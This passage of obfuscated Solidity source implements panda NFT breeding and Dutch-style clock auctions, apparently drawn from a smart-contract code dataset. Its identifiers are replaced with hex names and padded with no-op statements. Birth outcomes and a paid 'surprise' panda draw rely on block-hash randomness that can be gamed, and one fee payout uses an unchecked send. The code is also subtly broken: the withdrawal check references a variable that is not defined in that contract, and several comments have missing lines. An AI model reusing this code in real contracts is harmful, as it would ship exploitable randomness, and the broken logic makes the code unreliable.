_0x59c0ac._0xb7adc0 == _0x3ca881) {\n            return false;\n        }\n\n        // We can short circuit the sibling check (below) if either cat is\n        // gen zero (has a matron ID of zero).\n        if (_0x59c0ac._0xbb3677 == 0 || _0x05f201._0xbb3677 == 0) {\n            return true;\n        }\n\n        // Pandas can't breed with full or half siblings.\n        if (_0x59c0ac._0xbb3677 == _0x05f201._0xbb3677 || _0x59c0ac._0xbb3677 == _0x05f201._0xb7adc0) {\n            return false;\n        }\n        if (_0x59c0ac._0xb7adc0 == _0x05f201._0xbb3677 || _0x59c0ac._0xb7adc0 == _0x05f201._0xb7adc0) {\n            return false;\n        }\n\n        // male should get breed with female\n        if (_0xccef14._0xa15da8(_0x05f201._0xbf1ecd) + _0xccef14._0xa15da8(_0x59c0ac._0xbf1ecd) != 1) {\n            return false;\n        }\n\n        // Everything seems cool! Let's get DTF.\n        return true;\n    }\n\n    /// @dev Internal check to see if a given sire and matron are a valid mating pair for\n    ///  breeding via auction (i.e. skips ownership and siring approval checks).\n    function _0x2ce029(uint256 _0x3ca881, uint256 _0x573631)\n    internal\n    view\n    returns(bool) {\n        Panda storage _0x3b6482 = _0xb0b86d[_0x3ca881];\n        Panda storage _0x03ff36 = _0xb0b86d[_0x573631];\n        return _0x7e7fb8(_0x3b6482, _0x3ca881, _0x03ff36, _0x573631);\n    }\n\n    /// @notice Checks to see if two cats can breed together, including checks for\n    ///  ownership and siring approvals. Does NOT check that both cats are ready for\n    ///  breeding (i.e. breedWith could still fail until the cooldowns are finished).\n    ///  TODO: Shouldn't this check pregnancy and cooldowns?!?\n    /// @param _matronId The ID of the proposed matron.\n    /// @param _sireId The ID of the proposed sire.\n    function _0x42bbf3(uint256 _0x3ca881, uint256 _0x573631)\n    external\n    view\n    returns(bool) {\n        require(_0x3ca881 > 0);\n        require(_0x573631 > 0);\n        Panda storage _0x3b6482 = _0xb0b86d[_0x3ca881];\n        Panda storage _0x03ff36 = _0xb0b86d[_0x573631];\n        return _0x7e7fb8(_0x3b6482, _0x3ca881, _0x03ff36, _0x573631) &&\n            _0x9b716d(_0x573631, _0x3ca881);\n    }\n\n    function _0xdb4577(uint256 _0x3ca881, uint256 _0x573631) internal returns(uint256, uint256) {\n        if (_0xccef14._0xa15da8(_0xb0b86d[_0x3ca881]._0xbf1ecd) == 1) {\n            return (_0x573631, _0x3ca881);\n        } else {\n            return (_0x3ca881, _0x573631);\n        }\n    }\n\n    /// @dev Internal utility function to initiate breeding, assumes that all breeding\n    ///  requirements have been checked.\n    function _0x1669d4(uint256 _0x3ca881, uint256 _0x573631, address _0xa17562) internal {\n        // make id point real gender\n        (_0x3ca881, _0x573631) = _0xdb4577(_0x3ca881, _0x573631);\n        // Grab a reference to the Pandas from storage.\n        Panda storage _0x03ff36 = _0xb0b86d[_0x573631];\n        Panda storage _0x3b6482 = _0xb0b86d[_0x3ca881];\n\n        // Mark the matron as pregnant, keeping track of who the sire is.\n        _0x3b6482._0xdb6d0f = uint32(_0x573631);\n\n        // Trigger the cooldown for both parents.\n        _0xd1ee50(_0x03ff36);\n        _0xd1ee50(_0x3b6482);\n\n        // Clear siring permission for both parents. This may not be strictly necessary\n        // but it's likely to avoid confusion!\n        delete _0x752173[_0x3ca881];\n        delete _0x752173[_0x573631];\n\n        // Every time a panda gets pregnant, counter is incremented.\n        _0xc24ce3++;\n\n        _0xa1466f[_0x3ca881] = _0xa17562;\n\n        // Emit the pregnancy event.\n        Pregnant(_0x297de9[_0x3ca881], _0x3ca881, _0x573631, _0x3b6482._0x0221f6);\n    }\n\n    /// @notice Breed a Panda you own (as matron) with a sire that you own, or for which you\n    ///  have previously been given Siring approval. Will either make your cat pregnant, or will\n    ///  fail entirely. Requires a pre-payment of the fee given out to the first caller of giveBirth()\n    /// @param _matronId The ID of the Panda acting as matron (will end up pregnant if successful)\n    /// @param _sireId The ID of the Panda acting as sire (will begin its siring cooldown if successful)\n    function _0x3c9dd6(uint256 _0x3ca881, uint256 _0x573631)\n    external\n    payable\n    _0x31b995 {\n        // Checks for payment.\n        require(msg.value >= _0x2cfff6);\n\n        // Caller must own the matron.\n        require(_0x1e9a1b(msg.sender, _0x3ca881));\n\n        // Neither sire nor matron are allowed to be on auction during a normal\n        // breeding operation, but we don't need to check that explicitly.\n        // For matron: The caller of this function can't be the owner of the matron\n        //   because the owner of a Panda on auction is the auction house, and the\n        //   auction house will never call breedWith().\n        // For sire: Similarly, a sire on auction will be owned by the auction house\n        //   and the act of transferring ownership will have cleared any oustanding\n        //   siring approval.\n        // Thus we don't need to spend gas explicitly checking to see if either cat\n        // is on auction.\n\n        // Check that matron and sire are both owned by caller, or that the sire\n        // has given siring permission to caller (i.e. matron's owner).\n        // Will fail for _sireId = 0\n        require(_0x9b716d(_0x573631, _0x3ca881));\n\n        // Grab a reference to the potential matron\n        Panda storage _0x3b6482 = _0xb0b86d[_0x3ca881];\n\n        // Make sure matron isn't pregnant, or in the middle of a siring cooldown\n        require(_0xe5c961(_0x3b6482));\n\n        // Grab a reference to the potential sire\n        Panda storage _0x03ff36 = _0xb0b86d[_0x573631];\n\n        // Make sure sire isn't pregnant, or in the middle of a siring cooldown\n        require(_0xe5c961(_0x03ff36));\n\n        // Test that these cats are a valid mating pair.\n        require(_0x7e7fb8(\n            _0x3b6482,\n            _0x3ca881,\n            _0x03ff36,\n            _0x573631\n        ));\n\n        // All checks passed, panda gets pregnant!\n        _0x1669d4(_0x3ca881, _0x573631, msg.sender);\n    }\n\n    /// @notice Have a pregnant Panda give birth!\n    /// @param _matronId A Panda ready to give birth.\n    /// @return The Panda ID of the new kitten.\n    /// @dev Looks at a given Panda and, if pregnant and if the gestation period has passed,\n    ///  combines the genes of the two parents to create a new kitten. The new Panda is assigned\n    ///  to the current owner of the matron. Upon successful completion, both the matron and the\n\n    ///  are willing to pay the gas!), but the new kitten always goes to the mother's owner.\n    function _0x665905(uint256 _0x3ca881, uint256[2] _0x8bbe0f, uint256[2] _0xef531d)\n    external\n    _0x31b995\n    _0x66bdce\n    returns(uint256) {\n        // Grab a reference to the matron in storage.\n        Panda storage _0x3b6482 = _0xb0b86d[_0x3ca881];\n\n        // Check that the matron is a valid cat.\n        require(_0x3b6482._0x795adf != 0);\n\n        // Check that the matron is pregnant, and that its time has come!\n        require(_0x41b298(_0x3b6482));\n\n        // Grab a reference to the sire in storage.\n        uint256 _0xb7adc0 = _0x3b6482._0xdb6d0f;\n        Panda storage _0x03ff36 = _0xb0b86d[_0xb7adc0];\n\n        // Determine the higher generation number of the two parents\n        uint16 _0xb84d69 = _0x3b6482._0x125c0d;\n        if (_0x03ff36._0x125c0d > _0x3b6482._0x125c0d) {\n            _0xb84d69 = _0x03ff36._0x125c0d;\n        }\n\n        // Call the sooper-sekret gene mixing operation.\n        //uint256[2] memory childGenes = geneScience.mixGenes(matron.genes, sire.genes,matron.generation,sire.generation, matron.cooldownEndBlock - 1);\n        uint256[2] memory _0x8e4ee8 = _0x8bbe0f;\n\n        uint256 _0x94356e = 0;\n\n        // birth failed\n        uint256 _0x540dc0 = (_0xccef14._0xca443f(_0x3b6482._0xbf1ecd) + _0xccef14._0xca443f(_0x03ff36._0xbf1ecd)) / 2 + _0xef531d[0];\n        if (_0x540dc0 >= (_0xb84d69 + 1) * _0xef531d[1]) {\n            _0x540dc0 = _0x540dc0 - (_0xb84d69 + 1) * _0xef531d[1];\n        } else {\n            _0x540dc0 = 0;\n        }\n        if (_0xb84d69 == 0 && _0x288b09 == GEN0_TOTAL_COUNT) {\n            _0x540dc0 = 0;\n        }\n        if (uint256(_0x8109f2(block.blockhash(block.number - 2), _0xa86656)) % 100 < _0x540dc0) {\n            // Make the new kitten!\n            address _0xe349a8 = _0xa1466f[_0x3ca881];\n            _0x94356e = _0xaeb255(_0x3ca881, _0x3b6482._0xdb6d0f, _0xb84d69 + 1, _0x8e4ee8, _0xe349a8);\n        } else {\n            Abortion(_0x297de9[_0x3ca881], _0x3ca881, _0xb7adc0);\n        }\n        // Make the new kitten!\n        //address owner = pandaIndexToOwner[_matronId];\n        //address owner = childOwner[_matronId];\n        //uint256 kittenId = _createPanda(_matronId, matron.siringWithId, parentGen + 1, childGenes, owner);\n\n        // Clear the reference to sire from the matron (REQUIRED! Having siringWithId\n        // set is what marks a matron as being pregnant.)\n        delete _0x3b6482._0xdb6d0f;\n\n        // Every time a panda gives birth counter is decremented.\n        _0xc24ce3--;\n\n        // Send the balance fee to the person who made birth happen.\n        msg.sender.send(_0x2cfff6);\n\n        delete _0xa1466f[_0x3ca881];\n\n        // return the new kitten's ID\n        return _0x94356e;\n    }\n}\n\n/// @title Auction Core\n/// @dev Contains models, variables, and internal methods for the auction.\n/// @notice We omit a fallback function to prevent accidental sends to this contract.\ncontract ClockAuctionBase {\n\n    // Represents an auction on an NFT\n    struct Auction {\n        // Current owner of NFT\n        address _0x89ff99;\n        // Price (in wei) at beginning of auction\n        uint128 _0x88a9ea;\n        // Price (in wei) at end of auction\n        uint128 _0xd18782;\n        // Duration (in seconds) of auction\n        uint64 _0xa88913;\n        // Time when auction started\n        // NOTE: 0 if this auction has been concluded\n        uint64 _0xe76acc;\n        // is this auction for gen0 panda\n        uint64 _0xe37bd2;\n    }\n\n    // Reference to contract tracking NFT ownership\n    ERC721 public _0xd233c5;\n\n    // Cut owner takes on each auction, measured in basis points (1/100 of a percent).\n    // Values 0-10,000 map to 0%-100%\n    uint256 public _0x5da1c5;\n\n    // Map from token ID to their corresponding auction.\n    mapping (uint256 => Auction) _0xe877df;\n\n    event AuctionCreated(uint256 _0x329ab7, uint256 _0x88a9ea, uint256 _0xd18782, uint256 _0xa88913);\n    event AuctionSuccessful(uint256 _0x329ab7, uint256 _0x16a5ae, address _0xbaa6c2);\n    event AuctionCancelled(uint256 _0x329ab7);\n\n    /// @dev Returns true if the claimant owns the token.\n    /// @param _claimant - Address claiming to own the token.\n    /// @param _tokenId - ID of token whose ownership to verify.\n    function _0x1e9a1b(address _0x5a3786, uint256 _0x7651ea) internal view returns (bool) {\n        return (_0xd233c5._0x2aab77(_0x7651ea) == _0x5a3786);\n    }\n\n    /// @dev Escrows the NFT, assigning ownership to this contract.\n    /// Throws if the escrow fails.\n    /// @param _owner - Current owner address of token to escrow.\n    /// @param _tokenId - ID of token whose approval to verify.\n    function _0x80d649(address _0xa17562, uint256 _0x7651ea) internal {\n        // it will throw if transfer fails\n        _0xd233c5._0xeaa4ff(_0xa17562, this, _0x7651ea);\n    }\n\n    /// @dev Transfers an NFT owned by this contract to another address.\n    /// Returns true if the transfer succeeds.\n    /// @param _receiver - Address to transfer NFT to.\n    /// @param _tokenId - ID of token to transfer.\n    function _0x336ab1(address _0xda57ff, uint256 _0x7651ea) internal {\n        // it will throw if transfer fails\n        _0xd233c5.transfer(_0xda57ff, _0x7651ea);\n    }\n\n    /// @dev Adds an auction to the list of open auctions. Also fires the\n    ///  AuctionCreated event.\n    /// @param _tokenId The ID of the token to be put on auction.\n    /// @param _auction Auction to add.\n    function _0xedb1f0(uint256 _0x7651ea, Auction _0xb752eb) internal {\n        // Require that all auctions have a duration of\n        // at least one minute. (Keeps our math from getting hairy!)\n        require(_0xb752eb._0xa88913 >= 1 minutes);\n\n        _0xe877df[_0x7651ea] = _0xb752eb;\n\n        AuctionCreated(\n            uint256(_0x7651ea),\n            uint256(_0xb752eb._0x88a9ea),\n            uint256(_0xb752eb._0xd18782),\n            uint256(_0xb752eb._0xa88913)\n        );\n    }\n\n    /// @dev Cancels an auction unconditionally.\n    function _0x5ba50e(uint256 _0x7651ea, address _0x43bc09) internal {\n        _0x72db79(_0x7651ea);\n        _0x336ab1(_0x43bc09, _0x7651ea);\n        AuctionCancelled(_0x7651ea);\n    }\n\n    /// @dev Computes the price and transfers winnings.\n    /// Does NOT transfer ownership of token.\n    function _0xa28d49(uint256 _0x7651ea, uint256 _0x724b52)\n        internal\n        returns (uint256)\n    {\n        // Get a reference to the auction struct\n        Auction storage _0x9e3993 = _0xe877df[_0x7651ea];\n\n        // Explicitly check that this auction is currently live.\n        // (Because of how Ethereum mappings work, we can't just count\n        // on the lookup above failing. An invalid _tokenId will just\n        // return an auction object that is all zeros.)\n        require(_0x8fcfd9(_0x9e3993));\n\n        // Check that the bid is greater than or equal to the current price\n        uint256 _0x82ab71 = _0xa91a4c(_0x9e3993);\n        require(_0x724b52 >= _0x82ab71);\n\n        // Grab a reference to the seller before the auction struct\n        // gets deleted.\n        address _0x89ff99 = _0x9e3993._0x89ff99;\n\n        // The bid is good! Remove the auction before sending the fees\n        _0x72db79(_0x7651ea);\n\n        // Transfer proceeds to seller (if there are any!)\n        if (_0x82ab71 > 0) {\n            // Calculate the auctioneer's cut.\n            // (NOTE: _computeCut() is guaranteed to return a\n            // value <= price, so this subtraction can't go negative.)\n            uint256 _0xfdee13 = _0x3c2c9b(_0x82ab71);\n            uint256 _0x9dcdcf = _0x82ab71 - _0xfdee13;\n\n            // NOTE: Doing a transfer() in the middle of a complex\n            // method like this is generally discouraged because of\n            // a contract with an invalid fallback function. We explicitly\n            // before calling transfer(), and the only thing the seller\n\n            // accident, they can call cancelAuction(). )\n            _0x89ff99.transfer(_0x9dcdcf);\n        }\n\n        // Calculate any excess funds included with the bid. If the excess\n        // is anything worth worrying about, transfer it back to bidder.\n        // NOTE: We checked above that the bid amount is greater than or\n\n        uint256 _0x0bfcd5 = _0x724b52 - _0x82ab71;\n\n        // Return the funds. Similar to the previous transfer, this is\n        // removed before any transfers occur.\n        msg.sender.transfer(_0x0bfcd5);\n\n        // Tell the world!\n        AuctionSuccessful(_0x7651ea, _0x82ab71, msg.sender);\n\n        return _0x82ab71;\n    }\n\n    /// @dev Removes an auction from the list of open auctions.\n    /// @param _tokenId - ID of NFT on auction.\n    function _0x72db79(uint256 _0x7651ea) internal {\n        delete _0xe877df[_0x7651ea];\n    }\n\n    /// @dev Returns true if the NFT is on auction.\n    /// @param _auction - Auction to check.\n    function _0x8fcfd9(Auction storage _0xb752eb) internal view returns (bool) {\n        return (_0xb752eb._0xe76acc > 0);\n    }\n\n    /// @dev Returns current price of an NFT on auction. Broken into two\n    ///  functions (this one, that computes the duration from the auction\n    ///  structure, and the other that does the price computation) so we\n    ///  can easily test that the price computation works correctly.\n    function _0xa91a4c(Auction storage _0xb752eb)\n        internal\n        view\n        returns (uint256)\n    {\n        uint256 _0x15c64d = 0;\n\n        // A bit of insurance against negative values (or wraparound).\n        // Probably not necessary (since Ethereum guarnatees that the\n        // now variable doesn't ever go backwards).\n        if (_0xa86656 > _0xb752eb._0xe76acc) {\n            _0x15c64d = _0xa86656 - _0xb752eb._0xe76acc;\n        }\n\n        return _0xafcbf5(\n            _0xb752eb._0x88a9ea,\n            _0xb752eb._0xd18782,\n            _0xb752eb._0xa88913,\n            _0x15c64d\n        );\n    }\n\n    /// @dev Computes the current price of an auction. Factored out\n    ///  from _currentPrice so we can run extensive unit tests.\n    ///  When testing, make this function public and turn on\n    ///  `Current price computation` test suite.\n    function _0xafcbf5(\n        uint256 _0xac3729,\n        uint256 _0x25e497,\n        uint256 _0x0a2d9f,\n        uint256 _0x3ab561\n    )\n        internal\n        pure\n        returns (uint256)\n    {\n        // NOTE: We don't use SafeMath (or similar) in this function because\n        //  all of our public functions carefully cap the maximum values for\n        //  time (at 64-bits) and currency (at 128-bits). _duration is\n        //  also known to be non-zero (see the require() statement in\n        //  _addAuction())\n        if (_0x3ab561 >= _0x0a2d9f) {\n            // We've reached the end of the dynamic pricing portion\n            // of the auction, just return the end price.\n            return _0x25e497;\n        } else {\n            // Starting price can be higher than ending price (and often is!), so\n            // this delta can be negative.\n            int256 _0x383299 = int256(_0x25e497) - int256(_0xac3729);\n\n            // 64-bits, and totalPriceChange will easily fit within 128-bits, their product\n            // will always fit within 256-bits.\n            int256 _0xf378b8 = _0x383299 * int256(_0x3ab561) / int256(_0x0a2d9f);\n\n            // currentPriceChange can be negative, but if so, will have a magnitude\n            // less that _startingPrice. Thus, this result will always end up positive.\n            int256 _0xfb63a8 = int256(_0xac3729) + _0xf378b8;\n\n            return uint256(_0xfb63a8);\n        }\n    }\n\n    /// @dev Computes owner's cut of a sale.\n    /// @param _price - Sale price of NFT.\n    function _0x3c2c9b(uint256 _0xe9fc2a) internal view returns (uint256) {\n        // NOTE: We don't use SafeMath (or similar) in this function because\n        //  all of our entry functions carefully cap the maximum values for\n        //  currency (at 128-bits), and ownerCut <= 10000 (see the require()\n        //  statement in the ClockAuction constructor). The result of this\n        //  function is always guaranteed to be <= _price.\n        return _0xe9fc2a * _0x5da1c5 / 10000;\n    }\n\n}\n\ncontract Pausable is Ownable {\n  event Pause();\n  event Unpause();\n\n  bool public _0x5b0417 = false;\n\n  modifier _0x31b995() {\n    require(!_0x5b0417);\n    _;\n  }\n\n  modifier _0xf47ac1 {\n    require(_0x5b0417);\n    _;\n  }\n\n  function _0x027adb() _0x5d8f83 _0x31b995 returns (bool) {\n    if (block.timestamp > 0) { _0x5b0417 = true; }\n    Pause();\n    return true;\n  }\n\n  function _0xef4a6e() _0x5d8f83 _0xf47ac1 returns (bool) {\n    if (true) { _0x5b0417 = false; }\n    Unpause();\n    return true;\n  }\n}\n\n/// @title Clock auction for non-fungible tokens.\n/// @notice We omit a fallback function to prevent accidental sends to this contract.\ncontract ClockAuction is Pausable, ClockAuctionBase {\n\n    /// @dev The ERC-165 interface signature for ERC-721.\n    ///  Ref: https://github.com/ethereum/EIPs/issues/165\n    ///  Ref: https://github.com/ethereum/EIPs/issues/721\n    bytes4 constant InterfaceSignature_ERC721 = bytes4(0x9a20483d);\n\n    /// @dev Constructor creates a reference to the NFT ownership contract\n    ///  and verifies the owner cut is in the valid range.\n    /// @param _nftAddress - address of a deployed contract implementing\n    ///  the Nonfungible Interface.\n    /// @param _cut - percent cut the owner takes on each auction, must be\n    ///  between 0-10,000.\n    function ClockAuction(address _0x260501, uint256 _0x5c577c) public {\n        require(_0x5c577c <= 10000);\n        if (true) { _0x5da1c5 = _0x5c577c; }\n\n        ERC721 _0x1dde86 = ERC721(_0x260501);\n        require(_0x1dde86._0xc88e1a(InterfaceSignature_ERC721));\n        if (1 == 1) { _0xd233c5 = _0x1dde86; }\n    }\n\n    /// @dev Remove all Ether from the contract, which is the owner's cuts\n    ///  as well as any Ether sent directly to the contract address.\n    ///  Always transfers to the NFT contract, but can be called either by\n    ///  the owner or the NFT contract.\n    function _0xaeec1e() external {\n        address _0xe0184c = address(_0xd233c5);\n\n        require(\n            msg.sender == _0xe349a8 ||\n            msg.sender == _0xe0184c\n        );\n        // We are using this boolean method to make sure that even if one fails it will still work\n        bool _0xf98fc2 = _0xe0184c.send(this.balance);\n    }\n\n    /// @dev Creates and begins a new auction.\n    /// @param _tokenId - ID of token to auction, sender must be owner.\n    /// @param _startingPrice - Price of item (in wei) at beginning of auction.\n    /// @param _endingPrice - Price of item (in wei) at end of auction.\n    /// @param _duration - Length of time to move between starting\n    ///  price and ending price (in seconds).\n    /// @param _seller - Seller, if not the message sender\n    function _0xc5c01a(\n        uint256 _0x7651ea,\n        uint256 _0xac3729,\n        uint256 _0x25e497,\n        uint256 _0x0a2d9f,\n        address _0x43bc09\n    )\n        external\n        _0x31b995\n    {\n\n        // to store them in the auction struct.\n        require(_0xac3729 == uint256(uint128(_0xac3729)));\n        require(_0x25e497 == uint256(uint128(_0x25e497)));\n        require(_0x0a2d9f == uint256(uint64(_0x0a2d9f)));\n\n        require(_0x1e9a1b(msg.sender, _0x7651ea));\n        _0x80d649(msg.sender, _0x7651ea);\n        Auction memory _0x9e3993 = Auction(\n            _0x43bc09,\n            uint128(_0xac3729),\n            uint128(_0x25e497),\n            uint64(_0x0a2d9f),\n            uint64(_0xa86656),\n            0\n        );\n        _0xedb1f0(_0x7651ea, _0x9e3993);\n    }\n\n    /// @dev Bids on an open auction, completing the auction and transferring\n    ///  ownership of the NFT if enough Ether is supplied.\n    /// @param _tokenId - ID of token to bid on.\n    function _0xaed5e6(uint256 _0x7651ea)\n        external\n        payable\n        _0x31b995\n    {\n        // _bid will throw if the bid or funds transfer fails\n        _0xa28d49(_0x7651ea, msg.value);\n        _0x336ab1(msg.sender, _0x7651ea);\n    }\n\n    /// @dev Cancels an auction that hasn't been won yet.\n    ///  Returns the NFT to original owner.\n    /// @notice This is a state-modifying function that can\n    ///  be called while the contract is paused.\n    /// @param _tokenId - ID of token on auction\n    function _0x1da6c2(uint256 _0x7651ea)\n        external\n    {\n        Auction storage _0x9e3993 = _0xe877df[_0x7651ea];\n        require(_0x8fcfd9(_0x9e3993));\n        address _0x89ff99 = _0x9e3993._0x89ff99;\n        require(msg.sender == _0x89ff99);\n        _0x5ba50e(_0x7651ea, _0x89ff99);\n    }\n\n    /// @dev Cancels an auction when the contract is paused.\n    ///  Only the owner may do this, and NFTs are returned to\n    ///  the seller. This should only be used in emergencies.\n    /// @param _tokenId - ID of the NFT on auction to cancel.\n    function _0xa8d776(uint256 _0x7651ea)\n        _0xf47ac1\n        _0x5d8f83\n        external\n    {\n        Auction storage _0x9e3993 = _0xe877df[_0x7651ea];\n        require(_0x8fcfd9(_0x9e3993));\n        _0x5ba50e(_0x7651ea, _0x9e3993._0x89ff99);\n    }\n\n    /// @dev Returns auction info for an NFT on auction.\n    /// @param _tokenId - ID of NFT on auction.\n    function _0x915f05(uint256 _0x7651ea)\n        external\n        view\n        returns\n    (\n        address _0x89ff99,\n        uint256 _0x88a9ea,\n        uint256 _0xd18782,\n        uint256 _0xa88913,\n        uint256 _0xe76acc\n    ) {\n        Auction storage _0x9e3993 = _0xe877df[_0x7651ea];\n        require(_0x8fcfd9(_0x9e3993));\n        return (\n            _0x9e3993._0x89ff99,\n            _0x9e3993._0x88a9ea,\n            _0x9e3993._0xd18782,\n            _0x9e3993._0xa88913,\n            _0x9e3993._0xe76acc\n        );\n    }\n\n    /// @dev Returns the current price of an auction.\n    /// @param _tokenId - ID of the token price we are checking.\n    function _0xbede5b(uint256 _0x7651ea)\n        external\n        view\n        returns (uint256)\n    {\n        Auction storage _0x9e3993 = _0xe877df[_0x7651ea];\n        require(_0x8fcfd9(_0x9e3993));\n        return _0xa91a4c(_0x9e3993);\n    }\n\n}\n\n/// @title Reverse auction modified for siring\n/// @notice We omit a fallback function to prevent accidental sends to this contract.\ncontract SiringClockAuction is ClockAuction {\n\n    // @dev Sanity check that allows us to ensure that we are pointing to the\n    //  right auction in our setSiringAuctionAddress() call.\n    bool public _0xb654d9 = true;\n\n    // Delegate constructor\n    function SiringClockAuction(address _0x619ba1, uint256 _0x5c577c) public\n        ClockAuction(_0x619ba1, _0x5c577c) {}\n\n    /// @dev Creates and begins a new auction. Since this function is wrapped,\n    /// require sender to be PandaCore contract.\n    /// @param _tokenId - ID of token to auction, sender must be owner.\n    /// @param _startingPrice - Price of item (in wei) at beginning of auction.\n    /// @param _endingPrice - Price of item (in wei) at end of auction.\n    /// @param _duration - Length of auction (in seconds).\n    /// @param _seller - Seller, if not the message sender\n    function _0xc5c01a(\n        uint256 _0x7651ea,\n        uint256 _0xac3729,\n        uint256 _0x25e497,\n        uint256 _0x0a2d9f,\n        address _0x43bc09\n    )\n        external\n    {\n\n        // to store them in the auction struct.\n        require(_0xac3729 == uint256(uint128(_0xac3729)));\n        require(_0x25e497 == uint256(uint128(_0x25e497)));\n        require(_0x0a2d9f == uint256(uint64(_0x0a2d9f)));\n\n        require(msg.sender == address(_0xd233c5));\n        _0x80d649(_0x43bc09, _0x7651ea);\n        Auction memory _0x9e3993 = Auction(\n            _0x43bc09,\n            uint128(_0xac3729),\n            uint128(_0x25e497),\n            uint64(_0x0a2d9f),\n            uint64(_0xa86656),\n            0\n        );\n        _0xedb1f0(_0x7651ea, _0x9e3993);\n    }\n\n    /// @dev Places a bid for siring. Requires the sender\n    /// is the PandaCore contract because all bid methods\n    /// should be wrapped. Also returns the panda to the\n    /// seller rather than the winner.\n    function _0xaed5e6(uint256 _0x7651ea)\n        external\n        payable\n    {\n        require(msg.sender == address(_0xd233c5));\n        address _0x89ff99 = _0xe877df[_0x7651ea]._0x89ff99;\n        // _bid checks that token ID is valid and will throw if bid fails\n        _0xa28d49(_0x7651ea, msg.value);\n        // We transfer the panda back to the seller, the winner will get\n        // the offspring\n        _0x336ab1(_0x89ff99, _0x7651ea);\n    }\n\n}\n\n/// @title Clock auction modified for sale of pandas\n/// @notice We omit a fallback function to prevent accidental sends to this contract.\ncontract SaleClockAuction is ClockAuction {\n\n    // @dev Sanity check that allows us to ensure that we are pointing to the\n    //  right auction in our setSaleAuctionAddress() call.\n    bool public _0x80c52d = true;\n\n    // Tracks last 5 sale price of gen0 panda sales\n    uint256 public _0x5bb1d1;\n    uint256[5] public _0x5af66c;\n    uint256 public constant SurpriseValue = 10 finney;\n\n    uint256[] CommonPanda;\n    uint256[] RarePanda;\n    uint256   CommonPandaIndex;\n    uint256   RarePandaIndex;\n\n    // Delegate constructor\n    function SaleClockAuction(address _0x619ba1, uint256 _0x5c577c) public\n        ClockAuction(_0x619ba1, _0x5c577c) {\n            CommonPandaIndex = 1;\n            RarePandaIndex   = 1;\n    }\n\n    /// @dev Creates and begins a new auction.\n    /// @param _tokenId - ID of token to auction, sender must be owner.\n    /// @param _startingPrice - Price of item (in wei) at beginning of auction.\n    /// @param _endingPrice - Price of item (in wei) at end of auction.\n    /// @param _duration - Length of auction (in seconds).\n    /// @param _seller - Seller, if not the message sender\n    function _0xc5c01a(\n        uint256 _0x7651ea,\n        uint256 _0xac3729,\n        uint256 _0x25e497,\n        uint256 _0x0a2d9f,\n        address _0x43bc09\n    )\n        external\n    {\n\n        // to store them in the auction struct.\n        require(_0xac3729 == uint256(uint128(_0xac3729)));\n        require(_0x25e497 == uint256(uint128(_0x25e497)));\n        require(_0x0a2d9f == uint256(uint64(_0x0a2d9f)));\n\n        require(msg.sender == address(_0xd233c5));\n        _0x80d649(_0x43bc09, _0x7651ea);\n        Auction memory _0x9e3993 = Auction(\n            _0x43bc09,\n            uint128(_0xac3729),\n            uint128(_0x25e497),\n            uint64(_0x0a2d9f),\n            uint64(_0xa86656),\n            0\n        );\n        _0xedb1f0(_0x7651ea, _0x9e3993);\n    }\n\n    function _0x214fde(\n        uint256 _0x7651ea,\n        uint256 _0xac3729,\n        uint256 _0x25e497,\n        uint256 _0x0a2d9f,\n        address _0x43bc09\n    )\n        external\n    {\n\n        // to store them in the auction struct.\n        require(_0xac3729 == uint256(uint128(_0xac3729)));\n        require(_0x25e497 == uint256(uint128(_0x25e497)));\n        require(_0x0a2d9f == uint256(uint64(_0x0a2d9f)));\n\n        require(msg.sender == address(_0xd233c5));\n        _0x80d649(_0x43bc09, _0x7651ea);\n        Auction memory _0x9e3993 = Auction(\n            _0x43bc09,\n            uint128(_0xac3729),\n            uint128(_0x25e497),\n            uint64(_0x0a2d9f),\n            uint64(_0xa86656),\n            1\n        );\n        _0xedb1f0(_0x7651ea, _0x9e3993);\n    }\n\n    /// @dev Updates lastSalePrice if seller is the nft contract\n    /// Otherwise, works the same as default bid method.\n    function _0xaed5e6(uint256 _0x7651ea)\n        external\n        payable\n    {\n        // _bid verifies token ID size\n        uint64 _0xe37bd2 = _0xe877df[_0x7651ea]._0xe37bd2;\n        uint256 _0x82ab71 = _0xa28d49(_0x7651ea, msg.value);\n        _0x336ab1(msg.sender, _0x7651ea);\n\n        // If not a gen0 auction, exit\n        if (_0xe37bd2 == 1) {\n            // Track gen0 sale prices\n            _0x5af66c[_0x5bb1d1 % 5] = _0x82ab71;\n            _0x5bb1d1++;\n        }\n    }\n\n    function _0xe5973b(uint256 _0x7651ea,uint256 _0xf71efa)\n        external\n    {\n        require(msg.sender == address(_0xd233c5));\n        if (_0xf71efa == 0) {\n            CommonPanda.push(_0x7651ea);\n        }else {\n            RarePanda.push(_0x7651ea);\n        }\n    }\n\n    function _0x45a929()\n        external\n        payable\n    {\n        bytes32 _0x0a9e39 = _0x8109f2(block.blockhash(block.number),block.blockhash(block.number-1));\n        uint256 PandaIndex;\n        if (_0x0a9e39[25] > 0xC8) {\n            require(uint256(RarePanda.length) >= RarePandaIndex);\n            PandaIndex = RarePandaIndex;\n            RarePandaIndex ++;\n\n        } else{\n            require(uint256(CommonPanda.length) >= CommonPandaIndex);\n            PandaIndex = CommonPandaIndex;\n            CommonPandaIndex ++;\n        }\n        _0x336ab1(msg.sender,PandaIndex);\n    }\n\n    function _0x9ec8ed() external view returns(uint256 _0xe139dd,uint256 _0xc57301) {\n        _0xe139dd   = CommonPanda.length + 1 - CommonPandaIndex;\n        if (1 == 1) { _0xc57301 = RarePanda.length + 1 - RarePandaIndex; }\n    }\n\n    function _0x16be98() external view returns (uint256) {\n        uint256 _0xb5402a = 0;\n        for (uint256 i = 0; i < 5; i++) {\n            _0xb5402a += _0x5af66c[i];\n        }\n        return _0xb5402a / 5;\n    }\n\n}\n\n/// @title Clock auction modified for sale of pandas\n/// @notice We omit a fallback function to prevent accidental sends to this contract.\ncontract SaleClockAuctionERC20 is ClockAuction {\n\n    event AuctionERC20Created(uint256 _0x329ab7, uint256 _0x88a9ea, uint256 _0xd18782, uint256 _0xa88913, address _0x787f2b);\n\n    // @dev Sanity check that allows us to ensure that we are pointing to the\n    //  right auction in our setSaleAuctionAddress() call.\n    bool public _0xb2e46e = true;\n\n    mapping (uint256 => address) public _0xb8b936;\n\n    mapping (address => uint256) public _0xed95dc;\n\n    mapping (address => uint256) public _0xc8f629;\n\n    // Delegate constructor\n    function SaleClockAuctionERC20(address _0x619ba1, uint256 _0x5c577c) public\n        ClockAuction(_0x619ba1, _0x5c577c) {}\n\n    function _0x9352a6(address _0x8287a1, uint256 _0x0bd446) external{\n        require (msg.sender == address(_0xd233c5));\n\n        require (_0x8287a1 != 